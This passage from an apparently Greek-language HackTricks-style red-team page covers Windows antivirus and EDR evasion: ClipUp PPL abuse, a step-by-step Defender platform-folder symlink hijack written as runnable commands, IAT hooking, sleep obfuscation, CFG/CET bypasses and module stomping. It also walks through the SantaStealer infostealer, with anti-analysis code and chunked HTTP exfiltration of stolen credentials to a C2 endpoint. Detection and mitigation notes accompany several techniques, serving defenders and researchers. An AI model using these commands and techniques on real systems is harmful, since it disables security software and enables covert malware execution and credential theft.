4) Στο reboot το PPL-backed write γίνεται πριν το AV κλειδώσει τα binaries του, corrupting το target file και preventing startup.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Σημειώσεις και περιορισμοί
- Δεν μπορείς να ελέγξεις το περιεχόμενο που γράφει το ClipUp πέρα από την τοποθέτηση· το primitive είναι κατάλληλο για corruption και όχι για ακριβές content injection.
- Απαιτεί local admin/SYSTEM για να εγκαταστήσεις/ξεκινήσεις ένα service και ένα reboot window.
- Ο χρονισμός είναι κρίσιμος: ο στόχος δεν πρέπει να είναι ανοιχτός· η εκτέλεση κατά το boot αποφεύγει τα file locks.

Ανιχνεύσεις
- Process creation του `ClipUp.exe` με ασυνήθιστες παραμέτρους, ειδικά όταν έχει parent μη τυπικά launchers, γύρω από το boot.
- Νέα services ρυθμισμένα να auto-start suspicious binaries και που ξεκινούν σταθερά πριν από Defender/AV. Ερεύνησε service creation/modification πριν από Defender startup failures.
- File integrity monitoring σε Defender binaries/Platform directories· απροσδόκητα file creations/modifications από processes με protected-process flags.
- ETW/EDR telemetry: ψάξε για processes που δημιουργήθηκαν με `CREATE_PROTECTED_PROCESS` και για ανώμαλη χρήση PPL level από non-AV binaries.

Mitigations
- WDAC/Code Integrity: περιόρισε ποια signed binaries μπορούν να τρέξουν ως PPL και υπό ποιους parents· μπλόκαρε ClipUp invocation εκτός legitimate contexts.
- Service hygiene: περιόρισε τη δημιουργία/modification auto-start services και παρακολούθησε manipulation του start-order.
- Βεβαιώσου ότι το Defender tamper protection και τα early-launch protections είναι ενεργοποιημένα· ερεύνησε startup errors που δείχνουν binary corruption.
- Σκέψου να απενεργοποιήσεις το 8.3 short-name generation σε volumes που φιλοξενούν security tooling, αν είναι συμβατό με το περιβάλλον σου (δοκίμασέ το διεξοδικά).

References for PPL and tooling
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Tampering Microsoft Defender via Platform Version Folder Symlink Hijack

Το Windows Defender επιλέγει το platform από το οποίο θα τρέξει με απαρίθμηση των subfolders κάτω από:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Επιλέγει το subfolder με το υψηλότερο lexicographic version string (π.χ. `4.18.25070.5-0`), και μετά ξεκινά από εκεί τα Defender service processes (ενημερώνοντας αντίστοιχα τα service/registry paths). Αυτή η επιλογή εμπιστεύεται directory entries, συμπεριλαμβανομένων των directory reparse points (symlinks). Ένας administrator μπορεί να το εκμεταλλευτεί για να ανακατευθύνει το Defender σε attacker-writable path και να πετύχει DLL sideloading ή service disruption.

Προϋποθέσεις
- Local Administrator (απαιτείται για να δημιουργήσεις directories/symlinks κάτω από το Platform folder)
- Δυνατότητα reboot ή trigger επανεπιλογής Defender platform (service restart στο boot)
- Απαιτούνται μόνο built-in tools (mklink)

Γιατί λειτουργεί
- Το Defender μπλοκάρει writes στους δικούς του folders, αλλά η επιλογή platform εμπιστεύεται directory entries και επιλέγει το lexicographically υψηλότερο version χωρίς να επαληθεύει ότι το target επιλύεται σε protected/trusted path.

Βήμα-βήμα (παράδειγμα)
1) Προετοίμασε ένα writable clone του τρέχοντος platform folder, π.χ. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Δημιούργησε ένα symlink καταλόγου υψηλότερης έκδοσης μέσα στο Platform που να δείχνει στον φάκελό σου:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Επιλογή ενεργοποίησης (συνιστάται επανεκκίνηση):
```cmd
shutdown /r /t 0
```
4) Επαληθεύστε ότι το MsMpEng.exe (WinDefend) εκτελείται από το ανακατευθυνόμενο path:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Θα πρέπει να παρατηρήσετε το νέο process path κάτω από `C:\TMP\AV\` και τη ρύθμιση της υπηρεσίας/registry που αντικατοπτρίζει αυτήν τη θέση.

Post-exploitation options
- DLL sideloading/code execution: Drop/replace DLLs that Defender loads from its application directory to execute code in Defender’s processes. Δείτε την ενότητα παραπάνω: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Αφαιρέστε το version-symlink ώστε στην επόμενη εκκίνηση το configured path να μην επιλύεται και το Defender να αποτυγχάνει να ξεκινήσει:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Σημείωση ότι αυτή η τεχνική δεν παρέχει από μόνη της privilege escalation· απαιτεί admin rights.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Οι red teams μπορούν να μεταφέρουν το runtime evasion έξω από το C2 implant και μέσα στο ίδιο το target module, κάνοντας hook το Import Address Table (IAT) του και δρομολογώντας επιλεγμένα APIs μέσω attacker-controlled, position‑independent code (PIC). Αυτό γενικεύει το evasion πέρα από τη μικρή API surface που εκθέτουν πολλά kits (π.χ. CreateProcessA), και επεκτείνει τις ίδιες προστασίες σε BOFs και post‑exploitation DLLs.

High-level approach
- Στήσε ένα PIC blob δίπλα στο target module χρησιμοποιώντας έναν reflective loader (prepended ή companion). Το PIC πρέπει να είναι self-contained και position-independent.
- Καθώς φορτώνεται το host DLL, κάνε walk το IMAGE_IMPORT_DESCRIPTOR του και κάνε patch τα IAT entries για targeted imports (π.χ. CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) ώστε να δείχνουν σε thin PIC wrappers.
- Κάθε PIC wrapper εκτελεί evasions πριν κάνει tail-call στο πραγματικό API address. Τυπικά evasions περιλαμβάνουν:
- Memory mask/unmask γύρω από το call (π.χ. encrypt beacon regions, RWX→RX, αλλαγή page names/permissions) και μετά restore post‑call.
- Call-stack spoofing: κατασκεύασε ένα benign stack και πέρασε στο target API ώστε η call-stack analysis να καταλήγει σε αναμενόμενα frames.
- Για συμβατότητα, κάνε export ένα interface ώστε ένα Aggressor script (ή ισοδύναμο) να μπορεί να δηλώσει ποια APIs θα γίνονται hook για Beacon, BOFs και post‑ex DLLs.

Why IAT hooking here
- Λειτουργεί για κάθε code που χρησιμοποιεί το hooked import, χωρίς να τροποποιείς τον tool code ή να βασίζεσαι στο Beacon για proxy συγκεκριμένα APIs.
- Καλύπτει post‑ex DLLs: το hooking των LoadLibrary* σου επιτρέπει να interceptάρεις module loads (π.χ. System.Management.Automation.dll, clr.dll) και να εφαρμόσεις το ίδιο masking/stack evasion στις API calls τους.
- Αποκαθιστά αξιόπιστη χρήση των process-spawning post-ex commands απέναντι σε call-stack–based detections, μέσω wrapping των CreateProcessA/W.

Minimal IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Σημειώσεις
- Εφάρμοσε το patch μετά τα relocations/ASLR και πριν από την πρώτη χρήση του import. Reflective loaders όπως TitanLdr/AceLdr δείχνουν hooking κατά το DllMain του loaded module.
- Κράτα τα wrappers μικρά και PIC-safe· επίλυσε το true API μέσω της original IAT value που κατέγραψες πριν το patching ή μέσω LdrGetProcedureAddress.
- Χρησιμοποίησε RW → RX transitions για PIC και απέφυγε να αφήνεις writable+executable pages.

Call‑stack spoofing stub
- Draugr‑style PIC stubs χτίζουν ένα fake call chain (return addresses μέσα σε benign modules) και μετά pivotάρουν στο real API.
- Αυτό παρακάμπτει detections που περιμένουν canonical stacks από Beacon/BOFs προς sensitive APIs.
- Συνδύασέ το με stack cutting/stack stitching techniques για να προσγειωθείς μέσα σε αναμενόμενα frames πριν από το API prologue.

Operational integration
- Πρόθεσε τον reflective loader στα post-ex DLLs ώστε το PIC και τα hooks να αρχικοποιούνται αυτόματα όταν φορτώνεται το DLL.
- Χρησιμοποίησε ένα Aggressor script για να καταχωρήσεις target APIs ώστε Beacon και BOFs να επωφελούνται διαφανώς από το ίδιο evasion path χωρίς code changes.

Detection/DFIR considerations
- IAT integrity: entries που επιλύονται σε non-image (heap/anon) addresses· περιοδική επαλήθευση των import pointers.
- Stack anomalies: return addresses που δεν ανήκουν σε loaded images· απότομες μεταβάσεις σε non-image PIC· ασυνεπής RtlUserThreadStart ancestry.
- Loader telemetry: in-process writes στο IAT, early DllMain activity που τροποποιεί import thunks, απροσδόκητες RX regions που δημιουργούνται κατά το load.
- Image-load evasion: αν κάνεις hooking LoadLibrary*, παρακολούθησε ύποπτα loads από automation/clr assemblies που συσχετίζονται με memory masking events.

Related building blocks and examples
- Reflective loaders που κάνουν IAT patching κατά το load (π.χ. TitanLdr, AceLdr)
- Memory masking hooks (π.χ. simplehook) και stack-cutting PIC (stackcutting)
- PIC call-stack spoofing stubs (π.χ. Draugr)


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### Import-time IAT hooks via a resident PICO

Αν ελέγχεις έναν reflective loader, μπορείς να κάνεις hook imports **κατά** το `ProcessImports()` αντικαθιστώντας το loader's `GetProcAddress` pointer με έναν custom resolver που ελέγχει πρώτα τα hooks:

- Φτιάξε ένα **resident PICO** (persistent PIC object) που επιβιώνει αφού το transient loader PIC απελευθερώσει τον εαυτό του.
- Exportάρισε μια `setup_hooks()` function που overwrites τον loader's import resolver (π.χ. `funcs.GetProcAddress = _GetProcAddress`).
- Στο `_GetProcAddress`, παράλειψε ordinal imports και χρησιμοποίησε ένα hash-based hook lookup όπως `__resolve_hook(ror13hash(name))`. Αν υπάρχει hook, επέστρεψέ το· διαφορετικά κάνε delegate στο πραγματικό `GetProcAddress`.
- Καταχώρησε hook targets στο link time με Crystal Palace `addhook "MODULE$Func" "hook"` entries. Το hook παραμένει valid επειδή ζει μέσα στο resident PICO.

Αυτό δίνει **import-time IAT redirection** χωρίς να κάνεις patch το code section του loaded DLL post-load.

### Forcing hookable imports when the target uses PEB-walking

Τα import-time hooks ενεργοποιούνται μόνο αν η function βρίσκεται πράγματι στο IAT του target. Αν ένα module επιλύει APIs μέσω PEB-walk + hash (χωρίς import entry), ανάγκασε ένα πραγματικό import ώστε το `ProcessImports()` path του loader να το δει:

- Αντικατάστησε την hashed export resolution (π.χ. `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) με άμεση αναφορά όπως `&WaitForSingleObject`.
- Ο compiler θα εκπέμψει ένα IAT entry, επιτρέποντας interception όταν ο reflective loader επιλύει imports.

### Ekko-style sleep/idle obfuscation χωρίς patching του `Sleep()`

Αντί να κάνεις patch το `Sleep`, κάνε hook τα **πραγματικά wait/IPC primitives** που χρησιμοποιεί το implant (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Για μεγάλα waits, τύλιξε την κλήση σε μια Ekko-style obfuscation chain που κρυπτογραφεί το in-memory image κατά το idle:

- Χρησιμοποίησε `CreateTimerQueueTimer` για να προγραμματίσεις μια ακολουθία callbacks που καλούν `NtContinue` με crafted `CONTEXT` frames.
- Τυπική ακολουθία (x64): θέσε το image σε `PAGE_READWRITE` → RC4 encrypt μέσω `advapi32!SystemFunction032` πάνω στο full mapped image → εκτέλεσε το blocking wait → RC4 decrypt → **restore per-section permissions** περνώντας από PE sections → σήμα ολοκλήρωσης.
- Το `RtlCaptureContext` παρέχει ένα template `CONTEXT`· κάνε clone σε πολλαπλά frames και όρισε registers (`Rip/Rcx/Rdx/R8/R9`) για να καλέσεις κάθε βήμα.

Operational detail: επέστρεφε “success” για μεγάλα waits (π.χ. `WAIT_OBJECT_0`) ώστε ο caller να συνεχίζει ενώ το image είναι masked. Αυτό το pattern κρύβει το module από scanners κατά τα idle windows και αποφεύγει το κλασικό “patched `Sleep()`” signature.

Detection ideas (telemetry-based)
- Burst από `CreateTimerQueueTimer` callbacks που δείχνουν σε `NtContinue`.
- `advapi32!SystemFunction032` που χρησιμοποιείται σε μεγάλα contiguous image-sized buffers.
- Μεγάλης κλίμακας `VirtualProtect` ακολουθούμενο από custom per-section permission restoration.

### Runtime CFG registration for sleep-obfuscation gadgets

Σε targets με CFG enabled, το πρώτο indirect jump σε mid-function gadget όπως `jmp [rbx]` ή `jmp rdi` συνήθως θα κρασάρει τη διεργασία με `STATUS_STACK_BUFFER_OVERRUN` επειδή το gadget δεν υπάρχει στο module's CFG metadata. Για να κρατήσεις ζωντανές Ekko/Kraken-style chains μέσα σε hardened processes:

- Καταχώρησε κάθε indirect destination που χρησιμοποιεί η chain με `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` και εγγραφές `CFG_CALL_TARGET_VALID`.
- Για addresses μέσα σε loaded images (`ntdll`, `kernel32`, `advapi32`), το `MEMORY_RANGE_ENTRY` πρέπει να ξεκινά από το **image base** και να καλύπτει το **full image size**.
- Για manually mapped/PIC/stomped regions, χρησιμοποίησε το **allocation base** και το allocation size αντίστοιχα.
- Σήμανε όχι μόνο το dispatch gadget, αλλά και exports που προσεγγίζονται έμμεσα (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, wait/event syscalls) και οποιεσδήποτε attacker-controlled executable sections θα γίνουν indirect targets.

Αυτό μετατρέπει ROP/JOP-style sleep chains από "δουλεύει μόνο σε non-CFG processes" σε reusable primitive για `explorer.exe`, browsers, `svchost.exe` και άλλα endpoints compiled με `/guard:cf`.

### CET-safe stack spoofing for sleeping threads

Η πλήρης αντικατάσταση `CONTEXT` είναι θορυβώδης και μπορεί να σπάσει σε CET Shadow Stack systems επειδή ένα spoofed `Rip` πρέπει να συμφωνεί με το hardware shadow stack. Ένα ασφαλέστερο sleep-masking pattern είναι:

- Διάλεξε άλλο thread στο ίδιο process και διάβασε τα `NT_TIB` / TEB stack bounds (`StackBase`, `StackLimit`) μέσω `NtQueryInformationThread`.
- Κάνε backup το πραγματικό TEB/TIB του τρέχοντος thread.
- Capture το πραγματικό sleeping context με `GetThreadContext`.
- Αντέγραψε **μόνο** το πραγματικό `Rip` στο spoof context, αφήνοντας το spoofed `Rsp`/stack state άθικτο.
- Κατά το sleep window, αντέγραψε το spoof thread's `NT_TIB` στο current TEB ώστε οι stack walkers να κάνουν unwind μέσα σε legitimate stack range.
- Αφού τελειώσει το wait, επανέφερε το αρχικό TIB και thread context.

Αυτό διατηρεί ένα CET-consistent instruction pointer ενώ παραπλανεί EDR stack walkers που εμπιστεύονται τα TEB stack metadata για να επαληθεύουν unwinds.

### APC-based alternative: Kraken Mask

Αν το timer-queue dispatch είναι πολύ signatured, η ίδια sleep-encrypt-spoof-restore ακολουθία μπορεί να εκτελεστεί από suspended helper thread μέσω queued APCs:

- Δημιούργησε ένα helper thread με `NtTestAlert` ως entrypoint.
- Queue prepared `CONTEXT` frames/APCs με `NtQueueApcThread` και άδειασε τα με `NtAlertResumeThread`.
- Αποθήκευσε το chain state στο heap αντί για το helper stack ώστε να μην εξαντλήσεις το default 64 KB thread stack.
- Χρησιμοποίησε `NtSignalAndWaitForSingleObject` για να σημαδέψεις atomically το start event και να κάνεις block.
- Κάνε suspend το main thread πριν την επαναφορά του TIB/context (`NtSuspendThread` → restore → `NtResumeThread`) για να μειώσεις το race window όπου ένας scanner θα μπορούσε να πιάσει ένα half-restored stack.

Αυτό αντικαθιστά το signature `CreateTimerQueueTimer` + `NtContinue` με ένα helper-thread/APC signature ενώ κρατά τους ίδιους στόχους RC4 masking και stack-spoofing.

Additional detection ideas
- `NtSetInformationVirtualMemory` με `VmCfgCallTargetInformation` λίγο πριν από sleeps, waits ή APC dispatch.
- `GetThreadContext`/`SetThreadContext` γύρω από `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject`, ή `ConnectNamedPipe`.
- `NtQueryInformationThread` ακολουθούμενο από άμεσες εγγραφές μέσα στα current thread's TEB/TIB stack bounds.
- `NtQueueApcThread`/`NtAlertResumeThread` chains που φτάνουν έμμεσα σε `SystemFunction032`, `VirtualProtect`, ή helpers επαναφοράς section-permission.
- Επαναλαμβανόμενη χρήση σύντομων gadget signatures όπως `FF 23` (`jmp [rbx]`) ή `FF E7` (`jmp rdi`) ως dispatch pivots μέσα σε signed modules.


## Precision Module Stomping

Το Module stomping εκτελεί payloads από την **`.text` section ενός DLL που είναι ήδη mapped μέσα στο target process** αντί να δεσμεύει προφανή private executable memory ή να φορτώνει ένα νέο sacrificial DLL. Το overwrite target θα πρέπει να είναι μια **loaded, disk-backed image** της οποίας ο code space μπορεί να απορροφήσει το payload χωρίς να αλλοιώσει code paths που το process χρειάζεται ακόμα.

### Reliable target selection

Το naive stomping σε κοινά modules όπως `uxtheme.dll` ή `comctl32.dll` είναι fragile: το DLL μπορεί να μην είναι loaded στο remote process και ένα πολύ μικρό code region θα κρασάρει το process. Ένα πιο αξιόπιστο workflow είναι:

1. Enumerate τα target process modules και κράτα μια **names-only include list** από DLLs που είναι ήδη loaded.
2. Φτιάξε πρώτα το payload και κατέγραψε το **exact byte size**.
3. Σάρωσε candidate DLLs στο disk και σύγκρινε το PE section **`.text` `Misc_VirtualSize`** με το payload size. Αυτό έχει μεγαλύτερη σημασία από το file size επειδή αντανακλά το μέγεθος του executable section **όταν mapped in memory**.
4. Κάνε parse το **Export Address Table (EAT)** και διάλεξε ένα exported function RVA ως stomp start offset.
5. Υπολόγισε το **blast radius**: αν το payload ξεπερνά το selected function boundary, θα overwrite γειτονικά exports που βρίσκονται μετά από αυτό στη μνήμη.

Τυπικά recon/selection helpers που συναντώνται στο wild:
```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```
Operational notes
- Προτίμησε DLLs **already loaded** στο remote process για να αποφύγεις την τηλεμετρία του `LoadLibrary`/unexpected image loads.
- Προτίμησε exports που εκτελούνται σπάνια από το target application, αλλιώς τα normal code paths μπορεί να περάσουν πάνω από τα stomped bytes πριν ή μετά το thread creation.
- Τα μεγάλα implants συχνά απαιτούν αλλαγή του shellcode embedding από string literal σε **byte-array/braced initializer** ώστε ολόκληρο το buffer να αναπαριστάται σωστά στο injector source.

Detection ideas
- Remote writes σε **image-backed executable pages** (`MEM_IMAGE`, `PAGE_EXECUTE*`) αντί για τις πιο συνηθισμένες private RWX/RX allocations.
- Export entry points των οποίων τα in-memory bytes δεν ταιριάζουν πλέον με το backing file on disk.
- Remote threads ή context pivots που ξεκινούν execution μέσα σε ένα legitimate DLL export του οποίου τα πρώτα bytes έχουν πρόσφατα τροποποιηθεί.
- Suspicious `VirtualProtect(Ex)` / `WriteProcessMemory` sequences against DLL `.text` pages ακολουθούμενα από thread creation.

## SantaStealer Tradecraft for Fileless Evasion and Credential Theft

Το SantaStealer (aka BluelineStealer) δείχνει πώς τα σύγχρονα info-stealers συνδυάζουν AV bypass, anti-analysis και credential access σε ένα ενιαίο workflow.

### Keyboard layout gating & sandbox delay

- Ένα config flag (`anti_cis`) απαριθμεί τα εγκατεστημένα keyboard layouts μέσω του `GetKeyboardLayoutList`. Αν βρεθεί Cyrillic layout, το sample αφήνει ένα κενό `CIS` marker και τερματίζει πριν τρέξει stealers, εξασφαλίζοντας ότι δεν θα detonate ποτέ σε excluded locales ενώ αφήνει ένα hunting artifact.
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### Λογική `check_antivm` σε επίπεδα

- Η παραλλαγή A περνά από τη λίστα διεργασιών, κάνει hash κάθε ονόματος με ένα custom rolling checksum και το συγκρίνει με embedded blocklists για debuggers/sandboxes· επαναλαμβάνει το checksum για το όνομα του υπολογιστή και ελέγχει working directories όπως `C:\analysis`.
- Η παραλλαγή B εξετάζει system properties (process-count floor, recent uptime), καλεί `OpenServiceA("VBoxGuest")` για να εντοπίσει VirtualBox additions και εκτελεί timing checks γύρω από sleeps για να εντοπίσει single-stepping. Οποιοδήποτε hit τερματίζει πριν εκκινηθούν modules.

### Fileless helper + double ChaCha20 reflective loading

- Το primary DLL/EXE ενσωματώνει ένα Chromium credential helper που είτε αποθηκεύεται στο disk είτε γίνεται manually mapped in-memory· το fileless mode επιλύει μόνο του imports/relocations, ώστε να μη γραφτούν helper artifacts.
- Αυτό το helper αποθηκεύει ένα second-stage DLL κρυπτογραφημένο δύο φορές με ChaCha20 (δύο 32-byte keys + 12-byte nonces). Μετά από τα δύο passes, το φορτώνει reflectively (χωρίς `LoadLibrary`) και καλεί exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` που προέρχονται από [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).
- Οι ρουτίνες του ChromElevator χρησιμοποιούν direct-syscall reflective process hollowing για να inject σε έναν live Chromium browser, να κληρονομήσουν AppBound Encryption keys και να decrypt passwords/cookies/credit cards απευθείας από SQLite databases παρά το ABE hardening.


### Modular in-memory collection & chunked HTTP exfil

- Το `create_memory_based_log` περνάει από έναν global `memory_generators` function-pointer table και δημιουργεί ένα thread ανά ενεργό module (Telegram, Discord, Steam, screenshots, documents, browser extensions, etc.). Κάθε thread γράφει αποτελέσματα σε shared buffers και αναφέρει το file count του μετά από ένα ~45s join window.
- Μόλις ολοκληρωθεί, όλα γίνονται zip με τη statically linked βιβλιοθήκη `miniz` ως `%TEMP%\\Log.zip`. Το `ThreadPayload1` στη συνέχεια κοιμάται 15s και κάνει stream το archive σε 10 MB chunks μέσω HTTP POST προς `http://<C2>:6767/upload`, spoofing ένα browser `multipart/form-data` boundary (`----WebKitFormBoundary***`). Κάθε chunk προσθέτει `User-Agent: upload`, `auth: <build_id>`, προαιρετικό `w: <campaign_tag>`, και το τελευταίο chunk προσθέτει `complete: true` ώστε το C2 να ξέρει ότι η επανασυναρμολόγηση έχει ολοκληρωθεί.

## References


- [Advanced Evasion Tradecraft: Precision Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)
- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [Sleeping Beauty: Putting Adaptix to Bed with Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [Sleeping Beauty II: CFG, CET, and Stack Spoofing](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [Ekko sleep obfuscation](https://github.com/Cracked5pider/Ekko)
- [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)


{{#include ../banners/hacktricks-training.md}}
